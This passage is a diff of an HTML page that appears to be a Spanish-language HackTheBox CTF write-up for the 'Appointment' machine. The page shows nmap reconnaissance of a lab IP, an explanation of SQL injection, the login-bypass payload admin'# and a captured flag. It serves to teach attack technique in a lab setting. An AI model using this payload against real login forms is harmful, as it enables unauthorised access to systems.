@@ -1,430 +1,559 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>HTB — Appointment | SQL Injection Login Bypass</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
-<style>
-:root{--accent:#4ade80;--bg:#0a0e1a;--card:#111827;--card2:#1a2540;--border:#1e2d4a;--text:#e2e8f0;--text-muted:#64748b;--text-dim:#94a3b8;--red:#f87171;--yellow:#fbbf24;--blue:#60a5fa;--purple:#a78bfa;--orange:#fb923c;--cyan:#22d3ee;--green:#4ade80;}
-*{box-sizing:border-box;margin:0;padding:0;}
-body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;line-height:1.6;}
-code{background:var(--card2);padding:.15rem .4rem;border-radius:3px;font-family:'JetBrains Mono',monospace;font-size:.88em;color:var(--accent);}
-pre{margin:0;white-space:pre-wrap;word-break:break-all;font-family:'JetBrains Mono',monospace;}
-ul{padding-left:1.5rem;}li{margin:.35rem 0;}
-h2{font-size:1.4rem;color:var(--text);border-bottom:1px solid var(--border);padding-bottom:.5rem;margin-bottom:1.25rem;}
-h3{font-size:1.05rem;color:var(--text);margin-bottom:.75rem;}
-.hero{background:linear-gradient(135deg,#0a0e1a,#0d1a2b,#091a10);padding:4rem 2rem 3rem;position:relative;overflow:hidden;border-bottom:1px solid var(--border);}
-.hero::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle at 60% 40%,rgba(74,222,128,.06) 0%,transparent 60%);}
-.hero-inner{position:relative;z-index:1;max-width:1200px;margin:0 auto;padding:0 1.5rem;}
-.watermark{position:absolute;right:3rem;bottom:.5rem;font-size:9rem;color:rgba(74,222,128,.04);font-family:'JetBrains Mono',monospace;font-weight:900;line-height:1;user-select:none;}
-.badge{display:inline-block;background:rgba(74,222,128,.1);color:var(--accent);border:1px solid rgba(74,222,128,.3);border-radius:100px;padding:.25rem 1rem;font-size:.75rem;font-weight:600;margin-bottom:1rem;}
-.hero h1{font-size:3rem;font-weight:900;color:#fff;margin-bottom:.25rem;}
-.hero .subtitle{font-size:1.1rem;color:var(--text-dim);margin-bottom:1.25rem;}
-.meta-chips{display:flex;gap:.75rem;flex-wrap:wrap;margin-bottom:1.25rem;}
-.chip{background:var(--card2);border:1px solid var(--border);border-radius:6px;padding:.3rem .75rem;font-size:.8rem;color:var(--text-dim);}
-.flag-display{font-family:'JetBrains Mono',monospace;background:rgba(74,222,128,.1);color:var(--accent);padding:.5rem 1.25rem;border-radius:8px;display:inline-block;font-size:.9rem;border:1px solid rgba(74,222,128,.2);}
-.container{display:grid;grid-template-columns:1fr 300px;gap:2rem;max-width:1200px;margin:2rem auto;padding:0 1.5rem;}
-@media(max-width:900px){.container{grid-template-columns:1fr;}.code-compare,.lessons-grid{grid-template-columns:1fr;}}
-.section{margin:2.5rem 0;}
-.step-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
-.step-number{font-size:.7rem;color:var(--accent);font-weight:700;text-transform:uppercase;letter-spacing:3px;margin-bottom:.4rem;font-family:'JetBrains Mono',monospace;}
-.why-box{background:rgba(96,165,250,.07);border-left:3px solid var(--blue);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
-.why-box strong{color:var(--blue);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
-.why-box p{font-size:.9rem;color:var(--text-dim);}
-.cmd-annotated{background:#050810;border-radius:8px;padding:1rem 1.25rem;font-family:'JetBrains Mono',monospace;margin:1rem 0;border:1px solid var(--border);}
-.cmd-line{font-size:.95rem;line-height:2;}
-.cmd{color:var(--green);font-weight:700;}.flag-opt{color:var(--yellow);}.ip{color:var(--orange);}.param{color:var(--cyan);}
-.cmd-notes{margin-top:.75rem;padding-top:.75rem;border-top:1px solid var(--border);display:flex;flex-direction:column;gap:.3rem;}
-.cmd-note{font-size:.8rem;color:var(--text-dim);padding:.3rem .75rem;border-left:2px solid var(--border);}
-.output-box{background:#050810;border:1px solid var(--border);border-radius:8px;padding:1rem 1.25rem;font-family:'JetBrains Mono',monospace;font-size:.82rem;color:var(--text-dim);margin:1rem 0;overflow-x:auto;line-height:1.6;}
-.output-label{font-size:.65rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
-.interpret-box{background:rgba(74,222,128,.07);border-left:3px solid var(--accent);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
-.interpret-box strong{color:var(--accent);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
-.interpret-box p,.interpret-box li{font-size:.88rem;color:var(--text-dim);}
-.decision-box{background:rgba(251,146,60,.07);border-left:3px solid var(--orange);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
-.decision-box strong{color:var(--orange);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
-.decision-box p{font-size:.88rem;color:var(--text-dim);}
-.info-box{background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:1.25rem;margin:1.25rem 0;}
-.info-box p{font-size:.9rem;color:var(--text-dim);}
-.vuln-card{background:rgba(248,113,113,.06);border:1px solid rgba(248,113,113,.25);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
-.vuln-card h3{color:var(--red);margin-bottom:.75rem;}
-/* SQLI VISUALIZER */
-.sqli-box{background:#050810;border-radius:12px;padding:1.5rem;margin:1.5rem 0;border:1px solid var(--border);}
-.sqli-row{margin:.75rem 0;display:flex;align-items:flex-start;gap:1rem;}
-.sqli-label{color:var(--text-muted);font-size:.78rem;min-width:110px;font-family:'JetBrains Mono',monospace;padding-top:.2rem;flex-shrink:0;}
-.sqli-query{font-family:'JetBrains Mono',monospace;font-size:.88rem;line-height:1.8;flex:1;}
-.q-keyword{color:var(--blue);font-weight:700;}
-.q-string{color:var(--green);}
-.q-inject{color:var(--red);font-weight:900;font-size:1.1rem;}
-.q-comment{color:var(--text-muted);text-decoration:line-through;opacity:.55;}
-.q-result{color:var(--yellow);font-size:.8rem;margin-left:.5rem;}
-.sqli-divider{border:none;border-top:1px solid var(--border);margin:.75rem 0;}
-/* CODE COMPARE */
-.code-compare{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1.5rem 0;}
-.vuln-code,.safe-code{border-radius:8px;padding:1rem;border:1px solid;}
-.vuln-code{background:rgba(248,113,113,.05);border-color:rgba(248,113,113,.3);}
-.safe-code{background:rgba(74,222,128,.05);border-color:rgba(74,222,128,.3);}
-.code-header{font-size:.82rem;font-weight:700;margin-bottom:.75rem;}
-.vuln-code .code-header{color:var(--red);}
-.safe-code .code-header{color:var(--accent);}
-.code-box{background:#050810;border-radius:6px;padding:.75rem;font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--text-dim);margin:.5rem 0;}
-.code-note{font-size:.8rem;margin-top:.5rem;}
-.vuln-code .code-note{color:var(--red);}
-.safe-code .code-note{color:var(--accent);}
-/* CURL BREAKDOWN */
-.curl-breakdown{background:#050810;border-radius:12px;padding:1.5rem;border:1px solid var(--border);margin:1rem 0;}
-.curl-parts-top{display:flex;flex-wrap:wrap;gap:.75rem;margin-bottom:1rem;}
-.curl-part-item{display:flex;flex-direction:column;align-items:center;gap:.4rem;min-width:80px;}
-.curl-token{font-family:'JetBrains Mono',monospace;padding:.25rem .6rem;background:var(--card2);border-radius:4px;font-size:.82rem;white-space:nowrap;}
-.curl-token.cmd-t{color:var(--green);}
-.curl-token.flag-t{color:var(--yellow);}
-.curl-token.url-t{color:var(--orange);}
-.curl-explain-small{font-size:.72rem;color:var(--text-muted);text-align:center;max-width:100px;}
-.curl-payload{border-top:1px solid var(--border);padding-top:1rem;display:flex;gap:1rem;}
-.curl-payload-token{font-family:'JetBrains Mono',monospace;font-size:.82rem;color:var(--text-dim);background:var(--card2);padding:.4rem .75rem;border-radius:4px;flex-shrink:0;}
-.curl-payload-explain{font-size:.82rem;color:var(--text-dim);}
-.curl-payload-explain strong{color:var(--text);}
-/* PAYLOADS TABLE */
-.payloads-table{width:100%;border-collapse:collapse;font-size:.84rem;margin:1rem 0;}
-.payloads-table th{background:var(--card2);color:var(--text-muted);padding:.6rem 1rem;text-align:left;font-size:.72rem;text-transform:uppercase;}
-.payloads-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
-.payloads-table tr:last-child td{border-bottom:none;}
-.payloads-table td code{color:var(--red);background:rgba(248,113,113,.1);padding:.1rem .3rem;border-radius:3px;}
-.highlight-row{background:rgba(74,222,128,.04);}
-.highlight-row td{border-left:3px solid var(--accent);}
-.data-table{width:100%;border-collapse:collapse;font-size:.85rem;margin:1rem 0;}
-.data-table th{background:var(--card2);color:var(--text-muted);padding:.6rem 1rem;text-align:left;font-size:.75rem;text-transform:uppercase;}
-.data-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
-.data-table tr:last-child td{border-bottom:none;}
-.lessons-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0;}
-.lesson-card{background:var(--card2);border-radius:10px;padding:1.25rem;border:1px solid var(--border);}
-.lesson-card h4{font-size:.85rem;margin-bottom:.75rem;}
-.lesson-card.attacker h4{color:var(--orange);}
-.lesson-card.defender h4{color:var(--blue);}
-.lesson-card li{font-size:.83rem;color:var(--text-dim);}
-.flag-box{background:linear-gradient(135deg,rgba(74,222,128,.08),rgba(74,222,128,.02));border:1px solid rgba(74,222,128,.3);border-radius:14px;padding:2rem;text-align:center;margin:2.5rem 0;}
-.flag-label{font-size:.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:3px;margin-bottom:.75rem;}
-.flag-value{font-family:'JetBrains Mono',monospace;font-size:1.1rem;color:var(--accent);background:rgba(74,222,128,.1);padding:.6rem 1.5rem;border-radius:8px;display:inline-block;border:1px solid rgba(74,222,128,.2);}
-.sidebar{position:sticky;top:2rem;height:fit-content;}
-.sidebar-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin-bottom:1rem;}
-.sidebar-card h4{margin:0 0 .9rem;font-size:.72rem;text-transform:uppercase;letter-spacing:2px;color:var(--text-muted);}
-.meta-row{display:flex;justify-content:space-between;align-items:center;font-size:.83rem;padding:.45rem 0;border-bottom:1px solid var(--border);}
-.meta-row:last-child{border-bottom:none;}
-.meta-label{color:var(--text-muted);}.meta-value{color:var(--text);font-weight:600;font-family:'JetBrains Mono',monospace;font-size:.8rem;}
-.mitre-tag{display:inline-block;background:rgba(167,139,250,.1);color:var(--purple);border:1px solid rgba(167,139,250,.25);border-radius:4px;padding:.2rem .5rem;font-size:.72rem;font-family:'JetBrains Mono',monospace;margin:.2rem .15rem;}
-.score-num{font-size:2.8rem;font-weight:900;color:var(--accent);text-align:center;line-height:1;margin:.5rem 0;font-family:'JetBrains Mono',monospace;}
-.score-label{text-align:center;font-size:.75rem;color:var(--text-muted);}
-.record-badge{background:rgba(251,191,36,.1);color:var(--yellow);border:1px solid rgba(251,191,36,.3);border-radius:6px;padding:.3rem .75rem;font-size:.75rem;text-align:center;margin-top:.5rem;}
-.owasp-badge{background:rgba(248,113,113,.1);color:var(--red);border:1px solid rgba(248,113,113,.3);border-radius:6px;padding:.4rem .75rem;font-size:.78rem;font-weight:600;text-align:center;margin:.5rem 0;}
-.glosario-item{padding:.5rem 0;border-bottom:1px solid var(--border);font-size:.8rem;}
-.glosario-item:last-child{border-bottom:none;}
-.glosario-term{color:var(--cyan);font-weight:600;font-family:'JetBrains Mono',monospace;display:block;margin-bottom:.15rem;}
-.glosario-def{color:var(--text-muted);line-height:1.4;}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Appointment — HTB Writeup | YRD</title>
+  <style>
+    :root { --bg:#0a0e1a;--card-bg:#111827;--border:#1e2d4a;--primary:#4ade80;--cyan:#22d3ee;--text:#e2e8f0;--text-dim:#94a3b8;--text-muted:#64748b;--red:#f87171;--yellow:#fbbf24;--purple:#a78bfa;--orange:#fb923c; }
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;}
+    canvas#matrix{position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.13;pointer-events:none;z-index:0;}
+    .hero{position:relative;z-index:10;padding:3rem 2rem 2rem;max-width:1200px;margin:0 auto;}
+    .hero-breadcrumb{font-size:0.8rem;color:var(--text-muted);margin-bottom:1rem;}
+    .hero-breadcrumb a{color:var(--primary);text-decoration:none;}
+    .tags{display:flex;flex-wrap:wrap;gap:0.5rem;margin-bottom:1.5rem;}
+    .tag{padding:4px 12px;border-radius:20px;font-size:0.75rem;font-weight:600;letter-spacing:1px;text-transform:uppercase;}
+    .tag-htb{background:rgba(74,222,128,0.15);color:var(--primary);border:1px solid rgba(74,222,128,0.3);}
+    .tag-hmv{background:rgba(217,70,239,0.15);color:#d946ef;border:1px solid rgba(217,70,239,0.3);}
+    .tag-sherlock{background:rgba(34,211,238,0.15);color:var(--cyan);border:1px solid rgba(34,211,238,0.3);}
+    .tag-os{background:rgba(34,211,238,0.1);color:var(--cyan);border:1px solid rgba(34,211,238,0.25);}
+    .tag-easy{background:rgba(74,222,128,0.1);color:#4ade80;border:1px solid rgba(74,222,128,0.3);}
+    .tag-veryeasy{background:rgba(217,70,239,0.1);color:#d946ef;border:1px solid rgba(217,70,239,0.3);}
+    .tag-medium{background:rgba(251,191,36,0.1);color:var(--yellow);border:1px solid rgba(251,191,36,0.3);}
+    .tag-hard{background:rgba(248,113,113,0.1);color:var(--red);border:1px solid rgba(248,113,113,0.3);}
+    .hero h1{font-size:2.8rem;font-weight:800;line-height:1.2;margin-bottom:1rem;}
+    .hero h1 span{color:var(--primary);}
+    .hero-desc{font-size:1.05rem;color:var(--text-dim);line-height:1.7;max-width:700px;margin-bottom:1.5rem;}
+    .meta-row{display:flex;flex-wrap:wrap;gap:2rem;}
+    .meta-item{display:flex;flex-direction:column;gap:4px;}
+    .meta-label{font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;}
+    .meta-value{font-size:0.9rem;color:var(--text);font-weight:600;}
+    .meta-value.green{color:var(--primary);}
+    .main{position:relative;z-index:10;max-width:1200px;margin:0 auto;padding:2rem;display:grid;grid-template-columns:1fr 280px;gap:1.5rem;}
+    @media(max-width:900px){.main{grid-template-columns:1fr;}}
+    .content{display:flex;flex-direction:column;gap:2rem;}
+    .section{background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:1.75rem;}
+    .section-header{display:flex;align-items:center;gap:10px;margin-bottom:1.25rem;padding-bottom:0.75rem;border-bottom:1px solid var(--border);}
+    .section-icon{width:8px;height:8px;background:var(--primary);border-radius:50%;box-shadow:0 0 8px var(--primary);}
+    .section h2{font-size:1.1rem;font-weight:700;color:var(--primary);text-transform:uppercase;letter-spacing:2px;}
+    .section p{color:var(--text-dim);line-height:1.8;margin-bottom:0.75rem;}
+    .section p:last-child{margin-bottom:0;}
+    .section ul,.section ol{color:var(--text-dim);line-height:1.8;margin:0.5rem 0 0.75rem 1.5rem;}
+    .section li{margin-bottom:0.3rem;}
+    pre{background:#050810;border:1px solid var(--border);border-radius:8px;padding:2.5rem 1.25rem 1.25rem;overflow-x:auto;margin:1rem 0;font-size:0.82rem;line-height:1.6;position:relative;}
+    pre::before{content:'terminal';position:absolute;top:0;left:0;right:0;padding:8px 14px 8px 70px;background:#141d35;border-bottom:1px solid var(--border);border-radius:8px 8px 0 0;font-size:12px;color:var(--text-muted);font-family:'Segoe UI',system-ui,sans-serif;}
+    pre::after{content:'';position:absolute;top:10px;left:14px;width:12px;height:12px;border-radius:50%;background:#ff5f57;box-shadow:20px 0 0 #febc2e,40px 0 0 #28c840;}
+    code{font-family:'Cascadia Code','Fira Code','Courier New',monospace;}
+    .comment{color:#6a9955;}
+    .cmd{color:var(--cyan);}
+    .output{color:var(--text-dim);}
+    .highlight{color:var(--primary);font-weight:600;}
+    .cred{color:var(--yellow);font-weight:600;}
+    .flag-val{color:#ff79c6;}
+    .ip-badge{display:inline-block;background:rgba(74,222,128,0.1);border:1px solid rgba(74,222,128,0.3);color:var(--primary);padding:3px 10px;border-radius:6px;font-family:monospace;font-size:0.8rem;}
+    .flags-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-top:1rem;}
+    .flag-card{background:#050810;border:1px solid var(--border);border-radius:10px;padding:1.25rem;}
+    .flag-card .flag-label{font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:0.5rem;}
+    .flag-card .flag-hash{font-family:monospace;font-size:0.8rem;color:#ff79c6;word-break:break-all;}
+    .timeline{display:flex;flex-direction:column;gap:0;}
+    .timeline-item{display:flex;gap:1.25rem;}
+    .timeline-left{display:flex;flex-direction:column;align-items:center;}
+    .timeline-dot{width:12px;height:12px;background:var(--primary);border-radius:50%;box-shadow:0 0 10px var(--primary);flex-shrink:0;margin-top:4px;}
+    .timeline-line{width:2px;background:var(--border);flex:1;min-height:30px;}
+    .timeline-item:last-child .timeline-line{display:none;}
+    .timeline-content{padding-bottom:1.5rem;}
+    .timeline-step{font-size:0.7rem;color:var(--primary);text-transform:uppercase;letter-spacing:1px;font-weight:700;}
+    .timeline-title{font-size:0.95rem;color:var(--text);font-weight:600;margin:2px 0;}
+    .timeline-desc{font-size:0.82rem;color:var(--text-dim);line-height:1.6;}
+    .mitre-grid{display:flex;flex-wrap:wrap;gap:0.5rem;margin-top:1rem;}
+    .mitre-tag{background:rgba(74,222,128,0.08);border:1px solid rgba(74,222,128,0.2);color:var(--text-dim);padding:5px 12px;border-radius:6px;font-size:0.78rem;font-family:monospace;}
+    .sidebar{display:flex;flex-direction:column;gap:1.5rem;}
+    .sidebar-card{background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:1.5rem;}
+    .sidebar-card h3{font-size:0.8rem;text-transform:uppercase;letter-spacing:2px;color:var(--primary);margin-bottom:1.25rem;padding-bottom:0.5rem;border-bottom:1px solid var(--border);}
+    .detail-row{display:flex;justify-content:space-between;align-items:center;padding:0.5rem 0;border-bottom:1px solid rgba(26,61,26,0.5);}
+    .detail-row:last-child{border-bottom:none;}
+    .detail-key{font-size:0.8rem;color:var(--text-muted);}
+    .detail-val{font-size:0.82rem;color:var(--text);font-weight:600;text-align:right;}
+    .detail-val.green{color:var(--primary);}
+    .detail-val.cyan{color:var(--cyan);}
+    .skill-item{margin-bottom:1rem;}
+    .skill-item:last-child{margin-bottom:0;}
+    .skill-header{display:flex;justify-content:space-between;margin-bottom:5px;}
+    .skill-name{font-size:0.82rem;color:var(--text-dim);}
+    .skill-pct{font-size:0.8rem;color:var(--primary);font-weight:600;}
+    .skill-bar{height:4px;background:var(--border);border-radius:2px;}
+    .skill-fill{height:100%;background:linear-gradient(90deg,var(--primary),var(--cyan));border-radius:2px;}
+    .tools-list{display:flex;flex-direction:column;gap:0.6rem;}
+    .tool-item{display:flex;align-items:center;gap:10px;padding:0.6rem 0.75rem;background:#050810;border:1px solid var(--border);border-radius:8px;}
+    .tool-dot{width:6px;height:6px;background:var(--primary);border-radius:50%;}
+    .tool-name{font-size:0.82rem;color:var(--text-dim);font-family:monospace;}
+    .callout{border-radius:8px;padding:1rem 1.25rem;margin:1rem 0;border-left:3px solid;}
+    .callout-info{background:rgba(34,211,238,0.05);border-color:var(--cyan);color:var(--text-dim);}
+    .callout-danger{background:rgba(248,113,113,0.05);border-color:var(--red);color:var(--text-dim);}
+    .callout-tip{background:rgba(74,222,128,0.05);border-color:var(--primary);color:var(--text-dim);}
+    .callout-warn{background:rgba(251,191,36,0.05);border-color:var(--yellow);color:var(--text-dim);}
+    .data-table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:0.85rem;}
+    .data-table th,.data-table td{padding:0.6rem 0.8rem;border:1px solid var(--border);text-align:left;}
+    .data-table th{background:#141d35;color:var(--primary);font-weight:600;font-size:0.8rem;text-transform:uppercase;letter-spacing:0.5px;}
+    .data-table td{color:var(--text-dim);}
+    a{color:var(--primary);text-decoration:none;}
+  </style>
 </head>
 <body>
+<canvas id="matrix"></canvas>
 
 <div class="hero">
-  <div class="hero-inner">
-    <div class="badge">HTB · Starting Point · Very Easy · Linux</div>
-    <h1>Appointment</h1>
-    <p class="subtitle">SQL Injection Login Bypass — Apache 2.4.38 + PHP + MySQL</p>
-    <div class="meta-chips">
-      <span class="chip">🖥 10.129.18.216</span>
-      <span class="chip">🐧 Linux Debian</span>
-      <span class="chip">🔌 Puerto 80 · HTTP</span>
-      <span class="chip">⏱ ~2 minutos</span>
-      <span class="chip">💻 2 comandos — récord absoluto</span>
-    </div>
-    <div class="flag-display">FLAG: e3d0796d002a446c0e622226f42e9672</div>
+  <div class="hero-breadcrumb"><a href="#">HTB Máquinas</a> / <a href="#">Linux</a> / Appointment</div>
+  <div class="tags">
+    <span class="tag tag-htb">HTB</span>
+    <span class="tag tag-os">LINUX</span>
+    <span class="tag tag-veryeasy">VERY EASY</span>
+    <span class="tag tag-htb">STARTING POINT</span>
   </div>
-  <div class="watermark">></div>
-</div>
-
-<div class="container">
-<main>
-
-<div class="section">
-  <h2>Resumen Ejecutivo</h2>
-  <div class="info-box">
-    <p>La máquina Appointment expone un servidor web <strong>Apache 2.4.38 en el puerto 80</strong> con un formulario de login vulnerable a SQL Injection. Al inyectar <code>admin'#</code> como nombre de usuario, el carácter <code>'</code> cierra el string SQL y <code>#</code> comenta el resto de la query (incluyendo la verificación de contraseña), permitiendo autenticarse como <code>admin</code> sin conocer su contraseña real. La flag apareció en el dashboard tras el login. <strong>2 comandos — récord absoluto del Starting Point.</strong></p>
+  <h1>Appointment <span>Machine</span></h1>
+  <p class="hero-desc">Aplicación web con formulario de login vulnerable a SQL Injection. Bypass de autenticación mediante inyección SQL clásica para obtener la flag.</p>
+  <div class="meta-row">
+    <div class="meta-item"><span class="meta-label">Autor</span><span class="meta-value green">Yoandy Ramírez Delgado</span></div>
+    <div class="meta-item"><span class="meta-label">Tipo</span><span class="meta-value">HTB Starting Point</span></div>
+    <div class="meta-item"><span class="meta-label">Herramienta Clave</span><span class="meta-value">nmap / gobuster</span></div>
+    <div class="meta-item"><span class="meta-label">Objetivo</span><span class="meta-value">root</span></div>
   </div>
 </div>
 
-<div class="section">
-  <h2>¿Qué es SQL Injection?</h2>
-  <p style="color:var(--text-dim);font-size:.92rem;margin-bottom:1rem;"><strong>SQL Injection</strong> es una vulnerabilidad donde el input del usuario se interpreta directamente como código SQL, permitiendo al atacante modificar la lógica de las consultas a la base de datos. Es una de las vulnerabilidades más antiguas (documentada desde 1998) y figura en el <strong>OWASP Top 10</strong> desde su primera edición.</p>
-  <div class="vuln-card">
-    <h3>⚠ Login bypass — el tipo más directo de SQLi</h3>
-    <p style="font-size:.9rem;color:var(--text-dim);">En lugar de extraer datos (que requiere más pasos), el login bypass simplemente hace que el servidor autentique al atacante sin verificar la contraseña. Resulta en acceso inmediato al panel de administración.</p>
-  </div>
+<div class="main">
+  <div class="content">
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Resumen Ejecutivo</h2></div>
+      
+
+<div class="info-box">
+<p>La máquina Appointment expone un servidor web <strong>Apache 2.4.38 en el puerto 80</strong> con un formulario de login vulnerable a SQL Injection. Al inyectar <code>admin'#</code> como nombre de usuario, el carácter <code>'</code> cierra el string SQL y <code>#</code> comenta el resto de la query (incluyendo la verificación de contraseña), permitiendo autenticarse como <code>admin</code> sin conocer su contraseña real. La flag apareció en el dashboard tras el login. <strong>2 comandos — récord absoluto del Starting Point.</strong></p>
 </div>
 
-<div class="section">
-  <h2>Reconocimiento — Paso a Paso</h2>
 
-  <div class="step-box">
-    <div class="step-number">Paso 1 — Reconocimiento</div>
-    <h3>Nmap — Descubrir Apache con formulario de login</h3>
-    <div class="why-box">
-      <strong>¿Por qué nmap directamente?</strong>
-      <p>Combinamos ping + nmap en este paso. El output de <code>-sC</code> en HTTP incluye el título de la página — si dice "Login", hay un formulario de autenticación que potencialmente es vulnerable a SQLi.</p>
     </div>
-    <div class="cmd-annotated">
-      <div class="cmd-line"><span class="cmd">nmap</span> <span class="flag-opt">-p80</span> <span class="flag-opt">-sC</span> <span class="flag-opt">-sV</span> <span class="flag-opt">-n</span> <span class="ip">10.129.18.216</span></div>
-      <div class="cmd-notes">
-        <div class="cmd-note"><code>-p80</code> → solo el puerto 80 (HTTP). Un escaneo previo confirmó que es el único puerto.</div>
-        <div class="cmd-note"><code>-sC</code> → scripts NSE por defecto. Para HTTP: <code>http-title</code> (extrae el título de la página), <code>http-server-header</code> (versión del servidor).</div>
-        <div class="cmd-note"><code>-sV</code> → versión exacta del servidor web</div>
-        <div class="cmd-note"><code>-n</code> → sin resolución DNS</div>
-      </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>¿Qué es SQL Injection?</h2></div>
+      
+
+<p style="color:var(--text-dim);font-size:.92rem;margin-bottom:1rem;"><strong>SQL Injection</strong> es una vulnerabilidad donde el input del usuario se interpreta directamente como código SQL, permitiendo al atacante modificar la lógica de las consultas a la base de datos. Es una de las vulnerabilidades más antiguas (documentada desde 1998) y figura en el <strong>OWASP Top 10</strong> desde su primera edición.</p>
+
+
+<div class="vuln-card">
+<h3>⚠ Login bypass — el tipo más directo de SQLi</h3>
+<p style="font-size:.9rem;color:var(--text-dim);">En lugar de extraer datos (que requiere más pasos), el login bypass simplemente hace que el servidor autentique al atacante sin verificar la contraseña. Resulta en acceso inmediato al panel de administración.</p>
+</div>
+
+
     </div>
-    <div class="output-box">
-      <div class="output-label">Output</div>
-      <pre>PORT   STATE SERVICE VERSION
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>⚠ Login bypass — el tipo más directo de SQLi</h2></div>
+      
+
+<p style="font-size:.9rem;color:var(--text-dim);">En lugar de extraer datos (que requiere más pasos), el login bypass simplemente hace que el servidor autentique al atacante sin verificar la contraseña. Resulta en acceso inmediato al panel de administración.</p>
+
+
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Reconocimiento — Paso a Paso</h2></div>
+      
+
+<div class="step-box">
+<div class="step-number">Paso 1 — Reconocimiento</div>
+<h3>Nmap — Descubrir Apache con formulario de login</h3>
+<div class="why-box">
+<strong>¿Por qué nmap directamente?</strong>
+<p>Combinamos ping + nmap en este paso. El output de <code>-sC</code> en HTTP incluye el título de la página — si dice "Login", hay un formulario de autenticación que potencialmente es vulnerable a SQLi.</p>
+</div>
+<div class="cmd-annotated">
+<div class="cmd-line"><span class="cmd">nmap</span> <span class="flag-opt">-p80</span> <span class="flag-opt">-sC</span> <span class="flag-opt">-sV</span> <span class="flag-opt">-n</span> <span class="ip">10.129.18.216</span></div>
+<div class="cmd-notes">
+<div class="cmd-note"><code>-p80</code> → solo el puerto 80 (HTTP). Un escaneo previo confirmó que es el único puerto.</div>
+<div class="cmd-note"><code>-sC</code> → scripts NSE por defecto. Para HTTP: <code>http-title</code> (extrae el título de la página), <code>http-server-header</code> (versión del servidor).</div>
+<div class="cmd-note"><code>-sV</code> → versión exacta del servidor web</div>
+<div class="cmd-note"><code>-n</code> → sin resolución DNS</div>
+</div>
+</div>
+<div class="output-box">
+<div class="output-label">Output</div>
+<pre>PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.38 ((Debian))
 |_http-server-header: Apache/2.4.38 (Debian)
 |_http-title: Login</pre>
-    </div>
-    <div class="interpret-box">
-      <strong>¿Qué nos dice cada línea?</strong>
-      <ul>
-        <li><code>Apache httpd 2.4.38 (Debian)</code> → versión específica de Apache en Debian (→ PHP como backend → MySQL como DB → vulnerable a SQLi con <code>#</code>)</li>
-        <li><code>http-title: Login</code> → <strong>CLAVE</strong>: el título de la página es "Login" — hay un formulario de autenticación que es nuestro vector</li>
-      </ul>
-    </div>
-    <div class="decision-box"><strong>Decisión tomada</strong><p>Formulario de login en Apache+PHP. Stack Apache+Debian = MySQL como backend. Intentar directamente SQLi con payload <code>admin'#</code> (comentario MySQL).</p></div>
-  </div>
+</div>
+<div class="interpret-box">
+<strong>¿Qué nos dice cada línea?</strong>
+<ul>
+<li><code>Apache httpd 2.4.38 (Debian)</code> → versión específica de Apache en Debian (→ PHP como backend → MySQL como DB → vulnerable a SQLi con <code>#</code>)</li>
+<li><code>http-title: Login</code> → <strong>CLAVE</strong>: el título de la página es "Login" — hay un formulario de autenticación que es nuestro vector</li>
+</ul>
+</div>
+<div class="decision-box"><strong>Decisión tomada</strong><p>Formulario de login en Apache+PHP. Stack Apache+Debian = MySQL como backend. Intentar directamente SQLi con payload <code>admin'#</code> (comentario MySQL).</p></div>
 </div>
 
-<div class="section">
-  <h2>Explotación — Paso a Paso</h2>
 
-  <div class="step-box">
-    <div class="step-number">Paso 2 — Explotación (EL ATAQUE)</div>
-    <h3>SQL Injection Login Bypass con curl POST</h3>
-    <div class="why-box">
-      <strong>¿Por qué curl y no el navegador?</strong>
-      <p>curl permite hacer peticiones HTTP desde la línea de comandos de forma scriptable, reproducible y sin interfaz gráfica. Perfecto para probar payloads de forma rápida y automatizable. <code>-X POST</code> y <code>-d</code> replican exactamente lo que haría un navegador al enviar el formulario.</p>
     </div>
 
-    <!-- CURL BREAKDOWN -->
-    <div class="curl-breakdown">
-      <div class="output-label">Disección del comando curl</div>
-      <div class="curl-parts-top">
-        <div class="curl-part-item">
